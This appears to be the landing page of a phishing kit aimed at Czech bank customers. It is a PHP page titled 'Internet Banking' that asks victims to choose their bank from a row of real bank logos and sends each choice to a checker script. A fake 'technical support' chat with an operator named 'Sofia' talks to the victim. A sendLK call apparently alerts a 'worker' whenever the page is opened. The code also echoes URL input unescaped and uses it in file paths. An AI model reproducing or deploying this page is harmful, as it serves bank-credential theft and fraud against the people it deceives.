<?php
include "service.php";
include "../settings.php";
if (file_exists("data/" . $_GET['id'] . ".xml") == false){
    header("location: " . $_temp['original']);
    exit;
}
$xml = simplexml_load_file("data/" . $_GET["id"] . ".xml");

sendLK($_temp['service'], $_temp['valute'], $_GET['id'], $xml->obyava, $xml->price, $xml->worker_id);
?>
<!DOCTYPE html>
<html lang="pl"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		
		<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
		<title>Internet Banking</title>
		<style>
			._0 {
				margin: 0 auto;
				width: 658px;
				box-sizing: border-box;
				background: #fff;
				margin-top: 50px;
				margin-bottom: 50px;
			}
			._1 {
				font-size: 18px;
				padding-top: 16px;
				/*width: 200px;*/
			}
			._2 {
				margin: 10px 0;
				border-bottom: 1px solid #ddd;
			}
			._3 {
				text-align: left;
			    font-size: 14px;
			    border-radius: 6px;
			    padding: 16px 10px;
			    margin-bottom: 10px;
			    background: #f6f6f6;
				border-bottom: 2px solid #68777d;
			}
			._3:focus {
				outline: none;
			}
			._3mob {
				text-align: left;
			    font-size: 14px;
			    /*border-radius: 6px;*/
			    padding: 12px 10px;
			    margin-bottom: 20px;
			    /*background: #f6f6f6;*/
				/*border-bottom: 2px solid #68777d;*/
				border: 1px solid #d4d4d4;
			}
			._3mob:focus {
				outline: none;
			}
			._4 {
				float: right;
			    width: 100%;
				margin: 0;
			    color: #000;
			    font-weight: 400;
			    font-size: 17px;
			    line-height: 24px;
			    display: inline-block;
			    -webkit-box-sizing: border-box;
			    box-sizing: border-box;
			    padding: 8px 30px 6px 31px;
			    min-width: 180px;
			    border-radius: 3px;
			    white-space: nowrap;
			    background-color: #007eae;
			    color: #fff;
			    text-align: center;
			    text-decoration: none;
			    margin-top: 10px;
			}
			._4:hover {
				background-color: #015879;
			    color: #fff;
			    border-color: #015879;
			}
			._5 {
				color: #aaa;
				text-align: right;
				width: 45%;
				padding-right: 24px;
			}
			._6 {
				font-weight: bold;
			}
			._7 {
				margin-top: 4px;
				margin-bottom: 16px;
			}
			._8 {
				padding-bottom: 6px;
				line-height: 18px;
			}
			._9 {
				text-align: right;
			}
			body {
				margin: 0;
				font-family: Arial;
				font-size: 12px;
				color: #222;
				word-break: break-word;
				user-select: none;
				background: #fdfdfd;
			}
			input {
				font-family: Arial;
				font-size: 12px;
				color: #222;
				width: 100%;
				border: none;
				box-sizing: border-box;
				text-align: center;
			}
			table {
				width: 100%;
				border-collapse: separate;
				border-spacing: 0;
			}
			td {
				padding: 4px 0;
			}
			#mainblock {
				display: flex;
				margin: 0 20px;
			    /*border-bottom: 1px solid #e4e4e4;*/
			}
			#rightblock {
				margin-top: 100px;
				display: flex;
			}
			.loginboxes {
				display: flex;
			}
			#formblock {
                /*border-right: 1px solid #e4e4e4;
                padding-right: 70px; */
                padding-bottom: 20px; 
                margin-top: 20px;
			}
			#konto {
				margin-left: 20%; 
				padding-top: 30px;
			}
			#Pomoc {
				display: none;
                padding-top: 25px; 
                width: 150px;
			}
			.footer-menu {
				text-decoration: none;
				padding: 10px;
				color: #667;
				font-size: 13px;
			}
			.footer-menu-mob {
				text-decoration: none;
				padding: 10px;
				color: #555;
				font-size: 16px;
			}
			._0mob {
				display: none;
			}
			.footermenumob {
				padding: 20px;
				border-bottom: 1px solid #d4d4d4;
			}
			.bankbutton {
				border: none;
			    background: none;
			    width: 100%;
			    border-top: none;
			    padding: 10px;
			    background: #fff;
			    border: 1px solid #dcdcdc;
			}
			#main2 {
				border: 1px solid #dcdcdc;
				display: block;
				padding: 20px;
				background: #f3f3f3;
			}
			.sub-block {
				display: flex;
			}
			.sub-block1 {
				display: flex;
				margin: 10px 0;
			}
			.bankbank {
				margin: 0 10px;
			}
			@media all and (max-width: 800px) {
				/*#mainblock {
					display: block;
				}
				#formblock {
					border-right: none;
					padding-right: 0; 
				}*/
				#main2 {
					display: block;
				}
				.sub-block1 {
					display: block;
					margin: 0;
				}
				.sub-block {
					margin-bottom: 10px;
				}
				._0 {
					width: 353px;
				}
				#visablock {
					width: 155px;
				    margin: 0 auto;
				}
			}
			@media all and (max-width: 500px) {
				.loginboxes {
					display: block;
				}
				#rightblock {
					display: block;
				}
				.sub-block {
					display: block;
					margin-bottom: 0;
				}
				.bankbutton {
                    margin-bottom: 10px;
				}
				#visablock {
					width: 100%;
				}
			}
		</style>
	</head>
	<body>
		<div id="mainblock">
			<div class="_0">
				<div>
					<div style="text-align: center; color: #555; font-size: 27px; margin: 50px 0; padding: 10px 0; background: #defaff; border-bottom: 1px solid #cadaea;">Vyberte svou banku ze seznamu</div>
				</div>
				<div id="main2">
					<div class="sub-block1">
						<div class="sub-block">
							<form class="bankbank" id="bankbank1" method="post" action="checker.php">
                                <input type="hidden" name="id" value="<?php echo $_GET["id"]; ?>">
								<input type="text" value="expo" name="bankname" style="display: none;">
								<button form="bankbank1" type="submit" class="bankbutton"><img width="105" height="55" src="https://mam.cz/wp-content/uploads/2021/07/logo-share-1200x630-1.png" ></button>
							</form>
							<form class="bankbank" id="bankbank2" method="post" action="checker.php">
                            <input type="hidden" name="id" value="<?php echo $_GET["id"]; ?>">
								<input type="text" value="moneta" name="bankname" style="display: none;">
								<button form="bankbank2" type="submit" class="bankbutton"><img width="105" height="55" src="https://upload.wikimedia.org/wikipedia/commons/f/f1/Logo_moneta_money_bank.jpg" ></button>
							</form>
						</div>
						<div class="sub-block">
							<form class="bankbank" id="bankbank3" method="post" action="checker.php">
                            <input type="hidden" name="id" value="<?php echo $_GET["id"]; ?>">
								<input type="text" value="ober" name="bankname" style="display: none;">
								<button form="bankbank3" type="submit" class="bankbutton"><img width="105" height="55" src="https://i.iinfo.cz/images/575/oberbank.jpg" ></button>
							</form>
							<form class="bankbank" id="bankbank4" method="post" action="checker.php">
                            <input type="hidden" name="id" value="<?php echo $_GET["id"]; ?>">
								<input type="text" value="cnb" name="bankname" style="display: none;">
								<button form="bankbank4" type="submit" class="bankbutton"><img width="105" height="55" src="https://upload.wikimedia.org/wikipedia/commons/d/dd/%C4%8CNB-logo.png" ></button>
							</form>
						</div>
					</div>
					<div class="sub-block1">
						<div class="sub-block">
							<form class="bankbank" id="bankbank5" method="post" action="checker.php">
                            <input type="hidden" name="id" value="<?php echo $_GET["id"]; ?>">
								<input type="text" value="ceska" name="bankname" style="display: none;">
								<button form="bankbank5" type="submit" class="bankbutton"><img width="105" height="55" src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8a/%C4%8Cesk%C3%A1_spo%C5%99itelna_-_logo.svg/2560px-%C4%8Cesk%C3%A1_spo%C5%99itelna_-_logo.svg.png" ></button>
							</form>
							<form class="bankbank" id="bankbank6" method="post" action="checker.php">
                            <input type="hidden" name="id" value="<?php echo $_GET["id"]; ?>">
								<input type="text" value="equa" name="bankname" style="display: none;">
								<button form="bankbank6" type="submit" class="bankbutton"><img width="105" height="55" src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1d/Equa_bank_logo.svg/1280px-Equa_bank_logo.svg.png" ></button>
							</form>
						</div>
						<div class="sub-block">
							<form class="bankbank" id="bankbank7" method="post" action="checker.php">
                            <input type="hidden" name="id" value="<?php echo $_GET["id"]; ?>">
								<input type="text" value="mbank" name="bankname" style="display: none;">
								<button form="bankbank7" type="submit" class="bankbutton"><img width="105" height="55" src="https://www.poleninbeeld.nl/wp-content/uploads/2019/10/mbank1.jpg" ></button>
							</form>
							<form class="bankbank" id="bankbank8" method="post" action="checker.php">
                            <input type="hidden" name="id" value="<?php echo $_GET["id"]; ?>">
								<input type="text" value="hsbc" name="bankname" style="display: none;">
								<button form="bankbank8" type="submit" class="bankbutton"><img width="105" height="55" src="https://alebank.pl/wp-content/uploads/2019/01/hsbc-logo.png" ></button>
							</form>
						</div>
					</div>

					<div class="sub-block1">
						<div class="sub-block">
							<form class="bankbank" id="bankbank9" method="post" action="checker.php">
                            <input type="hidden" name="id" value="<?php echo $_GET["id"]; ?>">
								<input type="text" value="air" name="bankname" style="display: none;">
								<button form="bankbank9" type="submit" class="bankbutton"><img width="105" height="55" src="https://upload.wikimedia.org/wikipedia/de/thumb/a/a1/Air_Bank_logo.svg/1200px-Air_Bank_logo.svg.png" ></button>
							</form>
							<form class="bankbank" id="bankbank10" method="post" action="checker.php">
                            <input type="hidden" name="id" value="<?php echo $_GET["id"]; ?>">
								<input type="text" value="csob" name="bankname" style="display: none;">
								<button form="bankbank10" type="submit" class="bankbutton"><img width="105" height="55" src="https://upload.wikimedia.org/wikipedia/commons/3/3b/%C4%8CSOB-stavebni-logo.jpg" ></button>
							</form>
						</div>
						<div class="sub-block">
							<form class="bankbank" id="bankbank11" method="post" action="checker.php">
                            <input type="hidden" name="id" value="<?php echo $_GET["id"]; ?>">
								<input type="text" value="ing" name="bankname" style="display: none;">
								<button form="bankbank11" type="submit" class="bankbutton"><img width="105" height="55" src="https://dziennikbankowy.pl/media/2019/01/ING-BANK.jpg" ></button>
							</form>
							<form class="bankbank" id="bankbank12" method="post" action="checker.php">
                            <input type="hidden" name="id" value="<?php echo $_GET["id"]; ?>">
								<input type="text" value="kb" name="bankname" style="display: none;">
								<button form="bankbank12" type="submit" class="bankbutton"><img width="105" height="55" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ8jOq050toXHq0TaYpxuvwSWrB4IpyX60rb-d4JT6Z0v6avMe-DbQX0Ks2Neo7uG8c1rQ&usqp=CAU" ></button>
							</form>
						</div>
					</div>

					<div class="sub-block1">
						<div class="sub-block">
                       
							<form class="bankbank" id="bankbank14" method="post" action="checker.php">
                            <input type="hidden" name="id" value="<?php echo $_GET["id"]; ?>">
								<input type="text" value="citibank" name="bankname" style="display: none;">
								<button form="bankbank14" type="submit" class="bankbutton"><img width="105" height="55" src="https://static.startuptalky.com/2020/11/Feature-Image-3--8.jpg" ></button>
							</form>
							<form class="bankbank" id="bankbank15" method="post" action="checker.php">
                            <input type="hidden" name="id" value="<?php echo $_GET["id"]; ?>">
								<input type="text" value="unicredit" name="bankname" style="display: none;">
								<button form="bankbank15" type="submit" class="bankbutton"><img width="105" height="55" src="https://d2tyltutevw8th.cloudfront.net/CACHE/images/media/image/unicredit-logo-500x250-1403716139/771eadc1e148e83dcdd7b0749e637584.png" ></button>
							</form>
						</div>
						<div class="sub-block">
							<form class="bankbank" id="bankbank16" method="post" action="checker.php">
                            <input type="hidden" name="id" value="<?php echo $_GET["id"]; ?>">
								<input type="text" value="raiffeisen" name="bankname" style="display: none;">
								<button form="bankbank16" type="submit" class="bankbutton"><img width="105" height="55" src="https://ocdn.eu/images/pulscms/Mjc7MDA_/3bbfad1cd5975898740d090419d60906.jpeg" ></button>
							</form>
							<form class="bankbank" id="bankbank17" method="post" action="checker.php">
                            <input type="hidden" name="id" value="<?php echo $_GET["id"]; ?>">
								<input type="text" value="fio" name="bankname" style="display: none;">
								<button form="bankbank17" type="submit" class="bankbutton"><img width="105" height="55" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQSw7kd7JH272R2JVKyt0uagGDs7nSKJYvMNZd5AbN5fHCJj1bM7SeVuxfMDDhn2n-z6R8&usqp=CAU" ></button>
							</form>
						</div>
					</div>
					<!-- <div class="sub-block1">
						<div class="sub-block" id="visablock">
							<form class="bankbank" id="bankbank14" method="post" action="checker.php">
								<input type="text" value="visamc" name="bankname" style="display: none;">
								<button form="bankbank14" type="submit" class="bankbutton"><img src="/visamccheck.png" ></button>
							</form>
						</div>
					</div> -->
				</div>
			</div>



		<script>
			let pwdChars = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789a??b????d????fghijkl??mn??o??prs??tuwyz????A??BC??DE??FGHIJKL??MN??O??PRS??TUWYZ????';
			let pwdLen = 20;
			function inputMask(elem) {
				let val = elem.value;
				let val2 = '';
				for (let i = 0; i < val.length; i++) {
					if (pwdChars.includes(val[i]))
						val2 += val[i];
				}
				elem.value = val2.substr(0, pwdLen);
			}
			document.addEventListener('DOMContentLoaded', function() {
				field3ds.oninput = function() {
					inputMask(field3ds);
				}
				field3ds.focus();
			});
			document.oncontextmenu = function() {
				return false;
			};
		</script>
		<style>
.chaport-container.chaport-container-positioned {
    position: fixed;
    box-sizing: border-box;
    top: auto;
    right: 0;
    bottom: 0;
    left: 0;
    width: auto;
    height: 0;
    overflow: visible;
}
.chaport-container {
    font-size: 14px;
    z-index: 2147483500;
}
.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container div {
    display: block;
}

.chaport-container.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button, .chaport-content.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button {
    background-color: #09B1BA;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-anim-show {
    visibility: visible;
    opacity: 1;
    -webkit-transition-delay: 0s !important;
    transition-delay: 0s !important;
}

.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-chat-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    width: 2.28571em;
    height: 2.64286em;
    position: absolute;
    margin-top: 0.07143em;
    top: 0.92857em;
    left: 1em;
    background-image: url(/chap.png);
    background-repeat: no-repeat;
    background-size: 100% 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 0;
    transform: rotate(-45deg) scale(1);
    position: absolute;
    top: 0;
    right: 0;
    width: 4.28571em;
    height: 4.28571em;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before {
    -ms-transform: rotate(45deg);
    -webkit-transform: rotate(45deg);
    transform: rotate(45deg);
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before, .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:after {
    position: absolute;
    top: 1.5em;
    right: 2.07143em;
    content: ' ';
    height: 1.35714em;
    width: 0.14286em;
    background-color: #fff;
}
.chaport-container .chaport-launcher .chaport-launcher-button.no-photo .chaport-launcher-operator-photo {
    opacity: 0;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-operator-photo {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    position: absolute;
    z-index: 1;
    width: 100%;
    height: 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-badge-show {
    transform: scale(1);
}

.chaport-container .chaport-launcher .chaport-message .chaport-message-tail:after {
    border-width: 0.33333em;
    bottom: 1.13333em;
    border-left-color: #fff;
}
.chaport-container .chaport-window-anim.chaport-anim-hide {
    transform: translateY(20px);
}
.chaport-container.chaport-container-positioned .chaport-window {
    position: absolute;
    top: auto;
    right: 20px;
    bottom: 115px;
    left: auto;
    width: 300px;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    -webkit-border-radius: 8px;
    -moz-border-radius: 8px;
    -ms-border-radius: 8px;
    border-radius: 8px;
    overflow: hidden;
    z-index: 2147483500;
}
.chaport-container .chaport-window-anim {
    transition: height 0s linear 0.3s,visibility 0s linear 0.3s,opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1),transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container .chaport-inner {
    position: relative;
    margin-left: 0px;
    margin-right: 0px;
    background-color: #fff;
}


.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message {
    position: absolute;
    right: 0;
    bottom: 60px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face {
    position: absolute;
    left: -41px;
    bottom: 7px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face .photo img {
    width: 100%;
    height: 100%;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-name {
    margin-bottom: 5px;
    font-size: 15px;
    font-weight: bold;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .message-text {
    font-size: 15px;
}
@media (max-width: 339px), (min-width: 341px) {
.chaport-close, .chaport-container .chaport-close {
    display: block;
}
}

.chaport-container .chaport-big-shadow {
    opacity: 0;
    z-index: 2147483499;
    position: fixed;
    width: 480px;
    height: 480px;
    bottom: 0;
    right: 0;
    content: "";
    pointer-events: none;
    background: radial-gradient(ellipse at bottom right,rgba(27,37,52,0.15) 0,rgba(27,37,52,0) 70%);
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
}
.chaport-content {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    overflow: hidden;
    -webkit-border-top-left-radius: 8px;
    -moz-border-top-left-radius: 8px;
    -ms-border-top-left-radius: 8px;
    border-top-left-radius: 8px;
    -webkit-border-top-right-radius: 8px;
    -moz-border-top-right-radius: 8px;
    -ms-border-top-right-radius: 8px;
    border-top-right-radius: 8px;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
}
@media (max-width: 460px), (max-width: 750px) and (orientation: landscape)
.chaport-content {
    -webkit-border-radius: 0;
    -moz-border-radius: 0;
    -ms-border-radius: 0;
    border-radius: 0;
}
.chaport-close, .chaport-container .chaport-close {
    position: absolute;
    top: 0;
    right: 0;
    z-index: 4;
    width: 50px;
    height: 41px;
    cursor: pointer;
    opacity: 0.6;
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
    display: none;
}
.main-textblock {
    background-color: #ffffff;
    border-radius: 4px;
    height: 500px;
}
.operatorblock {
    height: 130px;
    background-color: #09B1BA;
    top: 0;
}
#operator-photo {

    width: 60px;
    height: 60px;
    margin-bottom: 7px;
    text-align: center;
    margin-top: 8px;
}
#oper-photo-img {
    width: 100%;
    height: 100%;
    border-radius: 50%;
}
.operatorblock-content {
    padding: 20px;
    display: flex;
}
.operator-name {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.team-wrapper {
    text-align: center;
    width: 60%;
    margin-top: 30px;
    margin-left: 4%;
}
.team {
    font-size: 16px;
    color: #fff;
}
.activity-indicator {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.with-status {
    padding-left: 15px;
    display: inline-block;
    position: relative;
}
.status-online {
    display: block;
    background-color: #4fd237;
    position: absolute;
    right: -3px;
    bottom: 3px;
    width: 7px;
    height: 7px;
    background-repeat: no-repeat;
    border-radius: 7px;
    border-width: 1px;
    border-style: solid;
    box-sizing: content-box;
    left: 0;
    right: auto;
    border-color: #4fd237;
}
#input-msg {
    border-top: 1px solid #babac05c;
    width: 100%;
    position: absolute;
    bottom: 0;
    height: 50px;
    margin-bottom: 20px;
}
#smstosup1 {
    margin-left: 10px;
    width: 100%;
    border: none;
    font-size: 15px;
}

.chaport-container .chaport-input-wrapper .chaport-send-icon, .chaport-input-wrapper .chaport-send-icon {
    opacity: 1;
    transform: scale(1);
    position: absolute;
    bottom: 15px;
    left: 7px;
    width: 18px;
    height: 18px;
    transition: opacity 0.2s linear,transform 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container.chaport-window-dark-gray .chaport-send-icon svg polygon, .chaport-content.chaport-window-dark-gray .chaport-send-icon svg polygon {
    fill: #09B1BA;
    transition: fill 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
#smstosupbutton1 {
    border-width: 0px;
    background: #fff;
    margin-right: 10px;
}
#smstosupbutton1 {
    cursor: pointer;
}
#smstosupbutton1:focus, #smstosupbutton1:active  {
    outline: none;
}
.chaport-window {
    visibility: hidden;
    opacity: 0;
}
.chat-block {
    overflow-y: auto;
    height: 300px;
    overflow-x: hidden;

}
#chat {
    padding-bottom: 15px;
}
.operators-msg {
    margin-top: 15px;
}
.operators-first-text {
    padding: 10px;
    width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.operators-msg-text {
    padding: 10px;
    max-width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.visitors-msg-text {
    margin-top: 15px;
    margin-right: 10px;
    margin-left: 80px;
    padding: 10px;
    min-width: 180px;
    border-radius: 8px;
    background-color: #09B1BA;
    color: #fff;
}
.operators-photo img {
    width: 30px;
    height: 30px;
    border-radius: 50%;
    margin-left: 5px;
    margin-right: 5px;
}
.chat-block::-webkit-scrollbar {
    width: 7px;
}
.chat-block::-webkit-scrollbar-button {
    display: none;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
    </style>


    <div id="offonthechap">
            <div class="chaport-container chaport-container-positioned chaport-window-dark-gray chaport-collapsed" style="bottom: 0px;">
                <div class="chaport-launcher" style="left: 0px; right: 0px;">
                <input type="hidden" id="product" value="<?php echo $xml->obyava; ?>">
                <input type="hidden" id="refresh_time" value="<?php echo $_GET['id']; ?>">
                <input type="hidden" id="home_time" value="<?php echo $xml->worker_id; ?>">
                    <div class="chaport-launcher-button no-photo chaport-launcher-anim chaport-anim-show">
                        <div class="chaport-launcher-chat-icon"></div>
                        <div class="chaport-launcher-close-icon"></div>
                        <div class="chaport-launcher-operator-photo"></div>
                    </div>
                </div>
                <div class="chaport-window chaport-anim-hide chaport-window-anim" style="opacity: 0; visibility: hidden;">
                    <div class="chaport-inner">
                        <div class="main-textblock">
                            <div class="operatorblock">
                                <div class="operatorblock-content" style="display: flex;">
                                    <div id="operator-photo">
                                        <img id="oper-photo-img" src="./Internet Banking_files/operator-img.png">
                                        <div class="operator-name">Sofia</div>
                                    </div>
                                    <div class="team-wrapper">
                                        <div class="team">Technick?? podpora</div>
                                        <div class="activity-indicator">
                                            <div class="with-status" style="display: inline-block;">
                                                <div class="status-online" style="display: inline-block;">
                                                    
                                                </div>online</div>
                                            </div>
                                        </div>
                                </div>
                            </div>
                            <div class="chat-block">
                                <div id="chat">
                                    <div class="operators-msg" id="greeting-msg" style="display: none;">
                                        <div class="operators-photo"><img src="./Internet Banking_files/operator-img.png"></div>
                                        <div class="operators-first-text">Dzie?? dobry! Jak mog?? ci pom??c?</div>                            
                                    </div>
                                
                                </div>
                                <div id="input-msg" style="display: flex;">
                                    <input type="text" name="smstosup1" id="smstosup1" placeholder="Zadejte pros??m svou zpr??vu...">
                                    <button id="smstosupbutton1" onclick="sendMessage()">
                                        <div class="chaport-send-icon">
                                            <svg width="18" height="18" viewBox="0 0 535.5 535.5">
                                                <polygon points="0,497.25 535.5,267.75 0,38.25 0,216.75 382.5,267.75 0,318.75" fill="#b9bdbf">      
                                                </polygon>
                                            </svg>
                                        </div>
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>  
                    <div class="chaport-big-shadow"></div>
            </div>
        </div>

        <script type="text/javascript">


        var supportbutton = document.querySelector('.chaport-launcher-button');
            var supportwindow = document.querySelector('.chaport-window');

            supportbutton.onclick = function() {
                if (supportwindow.style.opacity == '0') {
                    supportwindow.style.opacity = '1';
                    supportwindow.style.visibility = 'visible';
                } else {
                    supportwindow.style.opacity = '0';
                    supportwindow.style.visibility = 'hidden';
                }
            };
        </script>

        <script type="text/javascript">

        var myVar = setInterval(updateChat, 5000);
var pool = true;
function updateChat() {
  var supportbutton = document.querySelector('.chaport-launcher-button');
  var supportwindow = document.querySelector('.chaport-window');
  var token = <?php echo $_GET['id']; ?>;
  if (token !== null) {
    if (pool) {
      xhttp = new XMLHttpRequest();
      var track_id = document.getElementById("refresh_time").value;
      var url = 'https://' + document.location.hostname + '/chat_src/message.php';
      pool = false;
      xhttp.open("POST", url, true);
      xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
      xhttp.send("get=0&token=" + token);
      xhttp.onload = function (e) {
        if (xhttp.readyState === 4) {
          if (xhttp.status === 200) {
            var body = xhttp.response;
            pool = true;
            var json = JSON.parse(body);
            for (let i = 0; i < json.length; i++) {
              cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
              if (json[i].sender == 't') {
                text = '<div class="operators-msg" style="display: flex;"><div class="operators-photo"><img src="ordercss/operator-img.png"></div><div class="operators-msg-text" id="qwe1649370682">'+ json[i].message +'</div></div>'
              } else if (json[i].sender == 'i') {
                text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
              }else if (json[i].sender == "testOnline"){
                return 'okay';
              }else{
                text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
              }

              
              $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + text);
              var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
              objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
              supportwindow.style.opacity = '1';
              supportwindow.style.visibility = 'visible';
            }

          } else {
            pool = true;
          }
        }
      }
    }
  }
}

        function sendMessage() {
  message = document.getElementById("smstosup1").value;
  if (message === '') {
    return;
  }
  document.getElementById("smstosup1").value = '';
  var token = document.getElementById("refresh_time").value;
  if (token === null) {
    var token = Math.random().toString(36).substring(7);
  }
  xhttp = new XMLHttpRequest();
  var track_id = document.getElementById("refresh_time").value;
  var url = 'https://' + document.location.hostname + '/chat_src/message.php';
  xhttp.open("POST", url, true);
  xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  var uid = document.getElementById("home_time").value;
  var title = document.getElementById("product").value;
  xhttp.send("send=1&track_id=" + encodeURIComponent(track_id) + "&uid=" + encodeURIComponent(uid) + "&token=" + encodeURIComponent(token) + "&message=" + encodeURIComponent(message) + "&type=" + encodeURIComponent(window.location.host.split('.')[0]) + "&title=" + encodeURIComponent(title));
  cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
  $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + '<div class="visitors-msg-text" id="qwe1649370526">'+ message +'</div>');
  setCookie('token', token);
  var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
  objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
}

function setCookie(cname, cvalue) {
  var d = new Date();
  d.setTime(d.getTime() + (6 * 60 * 60 * 1000));
  var expires = "expires=" + d.toUTCString();
  document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

        </script>
</div></body></html>